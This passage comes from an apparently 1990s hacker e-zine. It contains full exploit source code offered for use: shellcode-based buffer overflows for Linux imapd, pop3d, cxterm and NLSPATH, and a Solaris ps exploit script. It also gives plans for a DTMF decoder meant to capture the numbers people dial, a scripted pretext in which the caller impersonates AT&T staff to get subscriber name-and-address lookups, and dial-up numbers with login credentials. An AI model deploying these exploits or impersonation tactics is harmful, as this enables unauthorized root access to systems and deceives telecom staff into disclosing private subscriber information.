      persona_pause
      putserv "PRIVMSG $channel :$nick , $stupid([rand $stupid_size])"
      putlog "<<$nick>> Persona-Stupid"
      return 1
   }
   return 0
}

# function to answer goodbyes

proc pub_bye {nick uhost hand channel args} {
   global bye bye_size persona_flag
   if {$persona_flag} {
      persona_pause
      putserv "PRIVMSG $channel :$bye([rand $bye_size]) $nick"
      putlog "<<$nick>> Persona-Bye"
      return 1
   }
   return 0
}

# misc. functions

  proc pub_tk3 {nick uhost hand channel args} {
   global persona_flag
   if {$persona_flag} {
      persona_pause
      putserv "PRIVMSG $channel :$nick, check out tk3play at bleh"
      putlog "<<$nick>> Persona-tk3play"
      return 1
   }
   return 0
}


# function to enforce minimum pause between responses

proc persona_pause {} {
   global persona_flag persona_wait
   if {$persona_flag} {
      persona_off
      utimer $persona_wait persona_on
   }
   return 1
}

# functions to turn the personality on and off

proc persona_on {} {
   global persona_flag
   set persona_flag 1
   return 1
}

proc persona_off {} {
   global persona_flag
   set persona_flag 0
   return 1
}

putlog "Scorn's persona.tcl is loaded"

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. Linux imapd remote exploit : Savage
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 * IMAPd Linux/intel remote xploit by savage@apostols.org 1997-April-05
 *
 * Workz fine against RedHat and imapd distributed with pine
 *
 * Special THANKS to: b0fh,|r00t,eepr0m,moxx,Fr4wd,Kore and the rest of ToXyn !!!
 *
 * usage:
 *	$ (imap 0; cat) | nc victim 143
 *              |
 *              +--> usually from -1000 to 1000 ( try in steps of 100 )
 */

#include <stdio.h>

char shell[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\xeb\x3b\x5e\x89\x76\x08\x31\xed\x31\xc9\x31\xc0\x88"
"\x6e\x07\x89\x6e\x0c\xb0\x0b\x89\xf3\x8d\x6e\x08\x89\xe9\x8d\x6e"
"\x0c\x89\xea\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xe8\xc0\xff\xff\xff/bin/sh";

char username[1024+255];

void main(int argc, char *argv[]) {
	int i,a;
	long val;
	
	if(argc>1)
		a=atoi(argv[1]);
	else
		a=0;
	
	strcpy(username,shell);
	
	for(i=strlen(username);i<sizeof(username);i++)
		username[i]=0x90; /* NOP */

	val = 0xbffff501 + a;

	for(i=1024;i<strlen(username)-4;i+=4) 
	{
		username[i+0] = val & 0x000000ff;
		username[i+1] = (val & 0x0000ff00) >> 8;
		username[i+2] = (val & 0x00ff0000) >> 16;
		username[i+3] = (val & 0xff000000) >> 24;
	}
	
	username[ sizeof(username)-1 ] = 0;
	
        printf("%d LOGIN \"%s\" pass\n", sizeof(shell), username);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Linux pop3 remote exploit : Savage
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 * pop3d Linux/intel remote xploit by savage@apostols.org 1997-April-05
 *
 * workz fine against old pop3d distributed with pine.
 *
 * Special THANKS to: b0fh,|r00t,eepr0m,moxx,Fr4wd,Kore and the rest of ToXyn !!!
 *
 * usage:
 *      $ (imap 0; cat) | nc victim 143   -- "doesnt pop3 run on 110?" - so1o
 *              |
 *              +--> usually from -100 to 100
 */

#include <stdio.h>

char shell[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\xeb\x3b\x5e\x89\x76\x08\x31\xed\x31\xc9\x31\xc0\x88"
"\x6e\x07\x89\x6e\x0c\xb0\x0b\x89\xf3\x8d\x6e\x08\x89\xe9\x8d\x6e"
"\x0c\x89\xea\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xe8\xc0\xff\xff\xff/bin/sh";

char username[1024+255];

void main(int argc, char *argv[]) {
	int i,a;
	long val;
	
	if(argc>1)
		a=atoi(argv[1]);
	else
		a=0;
	
	strcpy(username,shell);
	
	for(i=strlen(username);i<sizeof(username);i++)
		username[i]=0x90; /* NOP */

	val = 0xbffff501 + a;

	for(i=1024;i<strlen(username)-4;i+=4) 
	{
		username[i+0] = val & 0x000000ff;
		username[i+1] = (val & 0x0000ff00) >> 8;
		username[i+2] = (val & 0x00ff0000) >> 16;
		username[i+3] = (val & 0xff000000) >> 24;
	}
	
	username[ sizeof(username)-1 ] = 0;
	
        printf("USER %s\nPASS Yoshemite\n", username);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. Linux cxterm exploit : Ming Zhang
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*

   cxterm buffer overflow exploit for Linux.  This code is tested on
   both Slackware 3.1 and 3.2.

                                        Ming Zhang
                                        mzhang@softcom.net
*/

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#define CXTERM_PATH "/usr/X11R6/bin/cxterm"
#define BUFFER_SIZE 1024
#define DEFAULT_OFFSET 50

#define NOP_SIZE 1
char nop[] = "\x90";
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc,char **argv)
{
   char *buff = NULL;
   unsigned long *addr_ptr = NULL;
   char *ptr = NULL;
   int i,OffSet = DEFAULT_OFFSET;

/* use a different offset if you find this program doesn't do the job */
   if (argc>1) OffSet = atoi(argv[1]);

   buff = malloc(2048);
   if(!buff)
   {
      printf("Buy more RAM!\n");
      exit(0);
   }
   ptr = buff;

   for (i = 0; i <= BUFFER_SIZE - strlen(shellcode) - NOP_SIZE;
i+=NOP_SIZE) {
        memcpy (ptr,nop,NOP_SIZE);
        ptr+=NOP_SIZE;
   }

   for(i=0;i < strlen(shellcode);i++)
      *(ptr++) = shellcode[i];

   addr_ptr = (long *)ptr;
   for(i=0;i < (8/4);i++)
      *(addr_ptr++) = get_sp() + OffSet;
   ptr = (char *)addr_ptr;
   *ptr = 0;
   (void) fprintf(stderr,
         "This bug is discovered by Ming Zhang
(mzhang@softcom.net)\n");
    /* Don't need to set ur DISPLAY to exploit this one, cool huh? */
    execl(CXTERM_PATH, "cxterm", "-xrm",buff, NULL);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  7. Linux nlspath exploit : Solar Designer
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 * NLSPATH buffer overflow exploit for Linux, tested on Slackware 3.1
 * by Solar Designer, 1997.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shellcode =
  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
  "\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
  "\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
  "\xcd\x80/"
  "/bin/sh"
  "0";

char *get_sp() {
   asm("movl %esp,%eax");
}

#define bufsize 2048
char buffer[bufsize];

main() {
  int i;

  for (i = 0; i < bufsize - 4; i += 4)
    *(char **)&buffer[i] = get_sp() - 3072;

  memset(buffer, 0x90, 512);
  memcpy(&buffer[512], shellcode, strlen(shellcode));

  buffer[bufsize - 1] = 0;

  setenv("NLSPATH", buffer, 1);

  execl("/bin/su", "/bin/su", NULL);
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  8. Solaris 2.5.1 ps exploit : J. Zbiciak
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

#!/bin/sh
#
# Exploit for Solaris 2.5.1 /usr/bin/ps
# J. Zbiciak, 5/18/97
#
# Just copy this into one file, upload it to a system, chmod 755 <file> and
# then run it using <file>

# change as appropriate
CC=gcc

# Build the "replacement message" :-)
cat > ps_expl.po << E_O_F
domain "SUNW_OST_OSCMD"
msgid "usage: %s\n%s\n%s\n%s\n%s\n%s\n%s\n"
msgstr "\055\013\330\232\254\025\241\156\057\013\332\334\256\025\343\150\220\013\200\016\222\003\240\014\224\032\200\012\234\003\240\024\354\073\277\354\300\043\277\364\334\043\277\370\300\043\277\374\202\020\040\073\221\320\040\010\220\033\300\017\202\020\040\001\221\320\040\010"
E_O_F

msgfmt -o /tmp/foo ps_expl.po

# Build the C portion of the exploit
cat > ps_expl.c << E_O_F

/*****************************************/
/* Exploit for Solaris 2.5.1 /usr/bin/ps */
/* J. Zbiciak,  5/18/97                  */
/*****************************************/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH      (632)
#define EXTRA           (256)

int main(int argc, char *argv[])
{
        char buf[BUF_LENGTH + EXTRA];
                      /* ps will grok this file for the exploit code */
        char *envp[]={"NLSPATH=/tmp/foo",0};
        u_long *long_p;
        u_char *char_p;
                        /* This will vary depending on your libc */
        u_long proc_link=0xef70ef70;
        int i;

        long_p = (u_long *) buf;

        /* This first loop smashes the target buffer for optargs */
        for (i = 0; i < (96) / sizeof(u_long); i++)
                *long_p++ = 0x10101010;

        /* At offset 96 is the environ ptr -- be careful not to mess it up */
        *long_p++=0xeffffcb0;
        *long_p++=0xffffffff;

        /* After that is the _ctype table.  Filling with 0x10101010 marks the
           entire character set as being "uppercase printable". */
        for (i = 0; i < (BUF_LENGTH-104) / sizeof(u_long); i++)
                *long_p++ = 0x10101010;

        /* build up _iob[0]  (Ref: /usr/include/stdio.h, struct FILE) */
        *long_p++ = 0xFFFFFFFF;   /* num chars in buffer */
        *long_p++ = proc_link;    /* pointer to chars in buffer */
        *long_p++ = proc_link;    /* pointer to buffer */
        *long_p++ = 0x0501FFFF;   /* unbuffered output on stream 1 */
        /* Note: "stdin" is marked as an output stream.  Don't sweat it. :-) */

        /* build up _iob[1] */
        *long_p++ = 0xFFFFFFFF;   /* num chars in buffer */
        *long_p++ = proc_link;    /* pointer to chars in buffer */
        *long_p++ = proc_link;    /* pointer to buffer */
        *long_p++ = 0x4201FFFF;   /* line-buffered output on stream 1 */

        /* build up _iob[2] */
        *long_p++ = 0xFFFFFFFF;   /* num chars in buffer */
        *long_p++ = proc_link;    /* pointer to chars in buffer */
        *long_p++ = proc_link;    /* pointer to buffer */
        *long_p++ = 0x4202FFFF;   /* line-buffered output on stream 2 */

        *long_p =0;

        /* The following includes the invalid argument '-z' to force the
           usage msg to appear after the arguments have been parsed. */
        execle("/usr/bin/ps", "ps", "-z", "-u", buf, (char *) 0, envp);
        perror("execle failed");

        return 0;
}
E_O_F

# Compile it
$CC -o ps_expl ps_expl.c

# And off we go!
exec ./ps_expl

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  9. 0wned.c : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*       THIS IS FUCKING PRIVATE SHIT, DONT DISTRIBUTE IT!@#        */
/* I CODED THIS QUICKLY ONE NIGHT, IT WILL ROOT ANY LINUX 2.0.x BOX */
/*               -D-O- -N-O-T- -D-I-S-T-R-I-B-U-T-E-                */
/*                      so1o@insecurity.org                         */

main()

{
        char a1='j',a2='0',a3='a',a4='r',a5='3';
        char b1='w',b2='n',b3='d';
        printf("%c%c%c %c%c%c\n",a1,a2,a2,a3,a4,a5);
        printf("%c %c %c %c %c\n\n",a2,b1,b2,a5,b3);
        printf("By so1o@insecurity.org 1997\n");
}

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. DTMF Decoder : xFli
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

DTMF Decoder plans.
-------------------

If you are into bigtime surveillance, or you just have some burning desire 
to get the phone number of your sisters sexy friend, then you will be 
interested in this little circuit. Basically, using this, you can use a tape
recorder and a pickup coil to record the DTMF tones sent when someone dials
a number, or if it is easier to you can wire it up to a phone jack and
decode in realtime, and then decode them to get the number dialled. This 
can cope with speed dialling, but you will need a reasonably good recording
to decode successfully. 

The circuit is simplicity itself, literally only 5 components. I could have
included an unreadable ascii circuit diag / pcb layout, but it would  have been
a waste of time, so the diags are available from http://www.codez.com and other
CodeZero sites.

The hardware takes the DTMF signal, decodes it and sends it to lpt1, where the
binary output of the ic is converted into standard numbers. The simple BASIC
program is included. Which is precompiled on http://www.codez.com

Component list:
----------------

1 x SSI202 18 pin Chip
1 x 3.579 MHz quartz crystal
2 x 27n Capacitors
1 x 1M resistor 

Source:
--------

DTMF DECODER SOFTWARE
------------------------------------------

' Use this to decode the output from the decoder hardware
' Not written by xFli, suggested in an electronics mag.

10 CLS:KEY OFF
20 I=INP(&H279) 
30 IF (I AND 128)=128 THEN 30
40 C=0
50 IF (I AND 8)=8 THEN C=C+1
60 IF (I AND 16)=16 THEN C=C+2
70 IF (I AND 32)=32 THEN C=C+4
80 IF (I AND 64)=64 THEN C=C+8
90 IF C=11 THEN PRINT" * ";:GOTO 180
100 IF C=12 THEN PRINT" # ";:GOTO 180
110 IF C=13 THEN PRINT" A ";:GOTO 180
120 IF C=14 THEN PRINT" B ";:GOTO 180
130 IF C=15 THEN PRINT" C ";:GOTO 180
140 IF C=0 THEN PRINT" D ";:GOTO 180
150 IF C=10 THEN PRINT" 0 ";:GOTO 180
160 PRINT C;
170 I=INP(&H279) 
180 IF (I AND 128)=0 THEN 180
190 T=TIMER
200 I=INP(&H279)
210 IF (TIMER-T)>5 THEN PRINT:PRINT:GOTO 30
220 IF (I AND 128) = 128 THEN 210
230 GOTO 50

In the magazine, it is advised you use gw-basic, which is included with very
very early DOS versions. It may or may not work with qbasic etc. I don't know.
These are also for UK tones, maybe they are different in the US.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Dealing With Directory Assistance Operators : Qytpo
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Alright, this information should be made available to everyone who cares
to read it. Any information used from this article is to be used at a
persons own risk. i will not be held responsible if any of this is used
for wrongfull purposes- ( it can, you just have to get really creative ).

Well, to start off, the job of the directory assistance operator, is to
give out addresses, phone numbers, and area codes, for the information
given to them. The operators can search from names, business names, and
government names, despite what anyone tells you, an AT&T DIRECTORY
ASSISTANCE OPERATOR CAN DO A CNA SEARCH. (Customer name and address)
If the particular operator says they cant, then bug them. yell at them. 
if they dont do it themselves, they will get their supervisor. and if you
make it sound really important they can do it. and if all that doesnt
work, try to find a naive operator, tell them you are an AT&T
administrator, and say, to press (Control+C) to bring up a CNA search on
their switch. A CNA search is a very valuable asset, if you cannot find a
CNA operator, give a directory assistance operator a whirl, chances are,
if you have a brain, and are a decent actor, you can get the listing for
the number you give them.

Routing.

The calls are routed through a large mainframe in each state department
How it works: Say you dial, 602-555-1212. that would put you through to an
operator ANYWHERE in the United States, where phoenix calls are routed
through to. it will not just appear in 602, allthought that is where it is
supposed to. If the switches in 602 are full, the call could end up
anywhere in the US. 

When the operator picks up the reciever- (it is actually a headset that
beeps). The call is automatically traced to whatever area code they
dialed. so if You dialed (602 555 1212). an operator anywhere in the US,
would get a listing on their screen, and a default city, in the upper left
hand corner [PHOE] (phoenix arizona). [ *note*: depending on the area
code, 602 for example, the operator can search the area codes permitted in
that area code..] 

for example, if you dialed 602-555-1212, the operator would be allowed to
search in 502 (the other area code in AZ) However, in some area codes,
they will make you redial, like LA, or TEXAS, or NEWYORK;
they have so many area codes, For example 310 and 210, in LOS ANGELES 
If you wanted a listing for LOS ANGELES, and dialed 210-555-1212, 
and wanted a listing for city in los angeles which was 310, they would
make you hang up and dial 310-555-1212. (the operator
shuld be saying to himself/herself, "no, this kiddie needz to call 310
instead, or i get fired for giving out bad information"...if they have a
clue)

Sample Call to a D A O for a CNA Search: ( The best way to get info )

( caller dials 555-1212 in area code )

<Operator  > City please?
<Caller    > Yes, this is James Thornton at AT&T the AT&T administrative
             assistance office. I need you to do a CNA Search for me.
<Operator  > I'm sorry sir, we're not permitted to do CNA searches.
<Caller    > Yes, I know. May I speak to a supervisor?
<Supervisor> This is So and So supervisor, how can I help you sir?
<Caller    > Yes, this is James Thornton down at the AT&T (also called Excel)
             office in Florida, we need a CNA search done for a XXX-XXX-XXXX.
<Supervisor> One moment please.
<Caller    > Ok.
<Supervisor> Ok, I am (or am not) showing a listing for XXX-XXX-XXXX,
             would you like that listing sir?
<Caller    > Yes please, and I would like that verbally. (if you time it just
             right, you can get the info for free. if yer beige boxing, it
             doesnt really make a difference tho.) - hang up, say "what" a few
             times, to make it sound like you didnt get the listing. and hang up
             before she finishes the second time. she can only bill you while
             you are on the line, and if she fucks up, you can get away with it
             with no bill while they read you the number. This method only
             works for a verbal listing. if yer quick enough. ;)

		     - - -   The NPA RULES.  - - -

NPA dialed  :  NPAS PERMITTED TO SEARCH IN FROM THE NPA DIALLED

   -----California----
   213             213
   209             408 510 707 916
   408             209 510
   415             510 707 
   510             209 408 415 707 916 
   707             209 415 510 916
   714             714
   916             209 510 707

   -------Texas-------
   210             512 915 
   214             817 903 972
   281             409 713
   409             281 512 713 817 903
   512             210 409 817 915
   713             281 409
   806             817 915
   817             214 409 512 806 903
   903             214 409 817
   915             210 512 806 817
   972             214 817 903


   -----New York------
   212             718 914 917
   315             518 607 716
   516             718
   518             315 607 914
   607             315 518 716 914
   716             315 607
   718             212 518 914
   914             212 518 607 718
   917 (cell)      212 718 914

   *note*: all other states can search all NPA's listed in that state.

- Qytpo (@#hackers on EFnet)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Russian fone #'s (+7 095 XXXxxxx) : CyberLirik
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

              Some Interesting ph0ne #'s [04.07.97]
                      [RUSSiA] +7 095 XXXxxxx
     written by CyberLirik (lirik@hotmail.com) [www.sqrt.com]

   ----------------------------------------------------------------
                  AT&T Calling Cards  Service
   ----------------------------------------------------------------

    9740074    Tone System - AT&T  Moscow HQ
               switch to tone mode
               press 0 to page operator
               then by pressing  "1" ya can record your voice message
               then by pressing "2" & "3"  ya can hear your record :)

    7555042    English-speeking AT&T operator
    1555042    Also Automate AT&T Calling System is here ( tone )

    7555555    Russian-speeking AT&T operator
    1555555    No  AT&T  Tone  Machine !

   ----------------------------------------------------------------
             Sprintnet Local  Dial-Ups 02501 & 03110 DNICs
                  GlobalOne = Sprintnet = Telenet
   ----------------------------------------------------------------

    9286344   9600
    9280985   9600
    9137166   9600  < Only for MAIL
    5789119   2400
    3428376   9600 real connect 2400
    9167373   SprintNet V34-19200
    9167272   ???
    9167171   ?

    00wait8   RoSprint PPP dialup.

   ----------------------------------------------------------------
                   ROSPAC Local Dial-Ups  02500 DNIC
   ----------------------------------------------------------------

    9270003   9600
    9563692   9600
    9563690

   ----------------------------------------------------------------
                   RosNet  Dialups  02506 DNIC
   ----------------------------------------------------------------

    975-8403
    913-3571
    921-2103
    201-2030    Voice:(095)206-8570,206-8458,206-7238
    442-6422
    442-8277
    442-7022
    442-8388
    442-7088
    442-8577
    442-8077
    442-6477
    20-906,33-571  Iskra-2

   ----------------------------------------------------------------
             IBM GLOBAL network Dial-Up (aka old Advantis Network)
   ----------------------------------------------------------------

     2586420

   ----------------------------------------------------------------
               Russia@Online Dial-Ups  28.8Kbps
   ----------------------------------------------------------------

    9132376   30 lines
    2584120   60 lines
    3619999
    2584161   Voice phone !

   ----------------------------------------------------------------
                InfoNet Euro
   ----------------------------------------------------------------

    9150001   28.8
    9150005   28.8
      2400 temp [unpublished]
      2400 temp [unpublished]
      2400 temp [unpublished]
      2400 temp [unpublished]

    2927056   Infonet Euro Voice !

   ----------------------------------------------------------------
         Sita Network (AOLGLOBALnet & SCITOR {aka EQUANT} )
   ----------------------------------------------------------------

    9563589   14400
    9676767
    9676730-9676769
    9676767
    9676784

    9562455   SITA voice! phones
    9564736

   ----------------------------------------------------------------
                         BT-Tymnet
   ----------------------------------------------------------------

    956-0699     9600  Real Tymnet      Voice 9563678
    503/9563691  TYM-X25 Sync

   ----------------------------------------------------------------
                 CentroNet DialUp  www.astro.ru
   ----------------------------------------------------------------

    7511704  14400

   ----------------------------------------------------------------
               Infotel dialUps  [02504]
   ----------------------------------------------------------------

    9585475
    9580226
    9580825
    9580575

   ----------------------------------------------------------------
               MMTEL DialUPs    [02503]  address on login:.db
   ----------------------------------------------------------------

    3371001    5 lines
    2419860
    2418340
    2461661

   ----------------------------------------------------------------
             www.Cityline.ru V34
   ----------------------------------------------------------------

    2587884     40 lines
    9567759     20
    2341901     10
    2450070     10
    2454414     10

   ----------------------------------------------------------------
      http://www.telekom.ru                   Elvis+
    Proxy 194.190.195.71. DNS 195.190.195.66.  temp  192.168.12.1
    SLIP login: iptest PPP login: pptest Password: guest
   ----------------------------------------------------------------

    974-51-22 (24 «¨­¨¨)
    961-51-22 (24 «¨­¨¨)
    230-61-84 (5 «¨­¨©)
    152-53-44 152-97-47 152-94-09
    152-31-72 152-93-32
    152-53-29 152-93-33
    152-41-09 152-53-38
    258-96-31 (30 «¨­¨©) 247-66-22 (30 «¨­¨©)
    532-82-47 ¥«¥­®£à ¤áª¨© ã§¥«
    532-81-98 532-81-29

   ----------------------------------------------------------------
                      www.dataforce.net
   ----------------------------------------------------------------

    9566749        voice 2889340
    2340591        (16 «¨­¨©)

   ----------------------------------------------------------------
                  PTT-Teleport  www.ptt.ru
   ----------------------------------------------------------------

    946-9383 voice about x.25,28,etc
    946-9393 modem PPP

   ----------------------------------------------------------------
            Demos 33.8 V34 HST
   ----------------------------------------------------------------

    958-19-75
    958-19-81     l:_demo
    956-62-85     p: demo
    956-62-86
    241-05-05
    961-32-00

   ----------------------------------------------------------------
           Dial ups  mailto:_CRUSAIDER2_@MSN.COM
